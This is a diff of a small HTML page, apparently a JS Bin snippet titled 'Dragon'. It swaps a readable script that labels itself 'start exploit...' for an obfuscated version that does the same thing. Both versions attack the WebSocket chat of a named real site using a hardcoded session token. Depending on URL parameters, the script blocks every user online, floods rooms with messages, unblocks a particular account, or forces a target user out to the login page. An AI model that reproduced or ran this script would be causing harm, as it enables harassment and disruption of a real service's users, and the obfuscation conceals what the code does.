@@ -2,8 +2,7 @@
 <!DOCTYPE html>
 <!--
 Created using JS Bin
-http://jsbin.com
-Copyright (c) 2019 by thegirlwiththedragontatoo (http://jsbin.com/zumijez/1/edit)
+Copyright (c) 2019 by thegirlwiththedragontatoo 
 Released under the MIT license: http://jsbin.mit-license.org
 -->
 <meta name="robots" content="noindex">
@@ -11,109 +10,9 @@ Released under the MIT license: http://jsbin.mit-license.org
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width">
-  <title>JS Bin</title>
+  <title>Dragon</title>
 </head>
 <body>
-  <script>
-    console.log("start exploit...");
-    const MSG = "Mazhai :P";
-    const ROOM = "kudumi";
-	  var blockall = false;
-	  var unblockall = false;
-    var guest = false;
-    var allok = false;
-    var guestname = "Dragon";
-    var user = '';
-    var role = '';
-    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
-    ws.onmessage = function(m) {
-      var jsonData = JSON.parse(m.data);
-      var dataType = jsonData.type;
-      console.log("message----",jsonData.data);
-      if(dataType=="register"){
-        	user = jsonData.data.username;
-          role = jsonData.data.role
-           if(jsonData.data.status=="success"){
-           	if((user != 'mazhai')&&(user == 'umayal')){
-			self_blocker();
-// 			blocker();
-//             	getblocklist();
-               /* window.setInterval(function() {
-                  send(ROOM, MSG);
-               }, 2000); */
-            	/* send() */;
-            }
-           }
-          if(jsonData.data.status=="guest"){
-          	guest = true;
-            register(guestname);
-          }
-           if(jsonData.data.type=="error"){
-          	guestname = guestname + Math.floor((Math.random() * 10) + 1);
-            register(guestname);
-          }
-        }
-      if(dataType=="blocks"){
-	      if(jsonData.data.blocks){
-			if(unblockall) jsonData.data.blocks.forEach((i)=>ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}})));
-	      }
-      }
-    if(dataType=="onliners"){
-	    if(jsonData.data.onliners){
-		    if(blockall) jsonData.data.onliners.forEach((i)=>ws.send(JSON.stringify({"type":"block-user","data":{"username":i.username}})));
-	    }			
-      }
-    }
-    console.log("ws--",ws);
-    initsession = () => {
-    	ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2rkbi"}}));
-    }
-    register = (guestname) => {
-    	 if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":guestname,"gender":"male"}}));}
-    }
-    send = (room,msg) => {
-    	console.log("state:", guest, user, role);
-      if(ws.OPEN){
-        ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
-        ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
-    }}
-    getblocklist = () => {
-    	 if(ws.OPEN){
-       	ws.send(JSON.stringify({"type":"blocks","data":["a"]}));
-       }
-    }
-    blocker = () => {
-    	 if(ws.OPEN){
-       	ws.send(JSON.stringify({"type":"block-user","data":{"username":"sam londonn"}}));
-       }
-    }
-    fetch_room = (r) => {
-	     if(ws.OPEN){
-       	ws.send(JSON.stringify({"type":"fetch","data":{"room":r}}));
-       }
-    }
-    self_blocker = () => {
-    	blockall = true;
-	    fetch_room(ROOM);
-    }
-    self_unblocker = () => {
-    	unblockall = true;
-	    if(ws.OPEN){ws.send(JSON.stringify({"type":"blocks","data":["a"]}));}
-    }
-    ws.onopen = () => {
-      initsession();
-			register(guestname);
-      /* window.setTimeout(function() {
-        connect(guestname);
-      }, 6000); */
-
-      window.setTimeout(function() {
-        ws.close();
-	      console.log("closed");
-      }, 120000);
-    }
-    
-    
-  </script>
+  <script>var _0x1f46=['http://chatroom.tamil2friends.com/login.php','onopen','setTimeout','close','closed','log','start\x20exploit...','location','get','msg','wss://chatroom.tamil2friends.com/chat','onmessage','data','type','message----','register','username','role','mazhai','all','sub','status','floor','random','blocks','send','stringify','unblock-user','onliners','forEach','block-user','ws--','init','male','state:','black','text','OPEN','sam\x20londonn','top','href'];(function(_0x4dbb1b,_0x42a639){var _0x2c8b26=function(_0x4405c3){while(--_0x4405c3){_0x4dbb1b['push'](_0x4dbb1b['shift']());}};_0x2c8b26(++_0x42a639);}(_0x1f46,0x19f));var _0x5537=function(_0x53b82e,_0x48d6d8){_0x53b82e=_0x53b82e-0x0;var _0x1da3ed=_0x1f46[_0x53b82e];return _0x1da3ed;};console[_0x5537('0x0')](_0x5537('0x1'));const urlParams=new URLSearchParams(window[_0x5537('0x2')]['search']);const target_user=urlParams['get']('id');const ROOM=urlParams[_0x5537('0x3')]('rm');const attack_type=urlParams[_0x5537('0x3')]('att');const MSG=urlParams['get'](_0x5537('0x4'));const repeat_time=parseInt(urlParams[_0x5537('0x3')]('rt'));const conn_time=parseInt(urlParams['get']('ct'));var blockall=![];var unblockall=![];var guest=![];var allok=![];var guestname='Dragon';var user='';var role='';ws=new WebSocket(_0x5537('0x5'));ws[_0x5537('0x6')]=function(_0x11c742){var _0x2cf913=JSON['parse'](_0x11c742[_0x5537('0x7')]);var _0x4d3689=_0x2cf913[_0x5537('0x8')];console[_0x5537('0x0')](_0x5537('0x9'),_0x2cf913[_0x5537('0x7')]);if(_0x4d3689==_0x5537('0xa')){user=_0x2cf913[_0x5537('0x7')][_0x5537('0xb')];role=_0x2cf913[_0x5537('0x7')][_0x5537('0xc')];if(_0x2cf913[_0x5537('0x7')]['status']=='success'){if(user!=_0x5537('0xd')&&(user==target_user||target_user==_0x5537('0xe'))){window['setInterval'](function(){if(attack_type='sb'){self_blocker();}else if(attack_type=_0x5537('0xf')){self_unblocker();}else if(attack_type='bl'){blocker();}else if(attack_type='sm'){send(ROOM,MSG);}else if(attack_type='lo'){loghimout();}else{console['log']('nothing');}},repeat_time);}}if(_0x2cf913[_0x5537('0x7')][_0x5537('0x10')]=='guest'){guest=!![];register(guestname);}if(_0x2cf913[_0x5537('0x7')][_0x5537('0x8')]=='error'){guestname=guestname+Math[_0x5537('0x11')](Math[_0x5537('0x12')]()*0xa+0x1);register(guestname);}}if(_0x4d3689==_0x5537('0x13')){if(_0x2cf913[_0x5537('0x7')][_0x5537('0x13')]){if(unblockall){_0x2cf913[_0x5537('0x7')][_0x5537('0x13')]['forEach'](_0x57582c=>ws[_0x5537('0x14')](JSON[_0x5537('0x15')]({'type':_0x5537('0x16'),'data':{'username':'mazhai'}})));unblockall=![];}}}if(_0x4d3689==_0x5537('0x17')){if(_0x2cf913[_0x5537('0x7')][_0x5537('0x17')]){if(blockall){_0x2cf913[_0x5537('0x7')]['onliners'][_0x5537('0x18')](_0x4025ec=>ws['send'](JSON[_0x5537('0x15')]({'type':_0x5537('0x19'),'data':{'username':_0x4025ec[_0x5537('0xb')]}})));blockall=![];}}}};console[_0x5537('0x0')](_0x5537('0x1a'),ws);initsession=()=>{ws[_0x5537('0x14')](JSON[_0x5537('0x15')]({'type':_0x5537('0x1b'),'data':{'session':'dsmq9q4okl9nq4nva1rtu2rkbi'}}));};register=_0x55520c=>{if(guest){ws[_0x5537('0x14')](JSON['stringify']({'type':_0x5537('0xa'),'data':{'username':_0x55520c,'gender':_0x5537('0x1c')}}));}};send=(_0x85cc96,_0x3b48db)=>{console[_0x5537('0x0')](_0x5537('0x1d'),guest,user,role);if(ws['OPEN']){ws[_0x5537('0x14')](JSON[_0x5537('0x15')]({'type':_0x5537('0x14'),'data':{'color':_0x5537('0x1e'),'room':_0x85cc96,'gifinput':'','_gifhidden':'','yinput':'','msg':_0x3b48db,'type':_0x5537('0x1f')}}));ws[_0x5537('0x14')](JSON['stringify']({'type':'unblock-user','data':{'username':_0x5537('0xd')}}));}};getblocklist=()=>{if(ws[_0x5537('0x20')]){ws[_0x5537('0x14')](JSON[_0x5537('0x15')]({'type':_0x5537('0x13'),'data':['a']}));}};blocker=()=>{if(ws[_0x5537('0x20')]){ws['send'](JSON[_0x5537('0x15')]({'type':_0x5537('0x19'),'data':{'username':_0x5537('0x21')}}));}};fetch_room=_0x4482ed=>{if(ws['OPEN']){ws[_0x5537('0x14')](JSON[_0x5537('0x15')]({'type':'fetch','data':{'room':_0x4482ed}}));}};self_blocker=()=>{blockall=!![];fetch_room(ROOM);};self_unblocker=()=>{unblockall=!![];getblocklist();};loghimout=()=>{window[_0x5537('0x22')][_0x5537('0x2')][_0x5537('0x23')]=_0x5537('0x24');parent['location'][_0x5537('0x23')]=_0x5537('0x24');};ws[_0x5537('0x25')]=()=>{initsession();register(guestname);window[_0x5537('0x26')](function(){register(guestname);},0x3e8);window[_0x5537('0x26')](function(){ws[_0x5537('0x27')]();console[_0x5537('0x0')](_0x5537('0x28'));},conn_time);};</script>
 </body>
 </html>
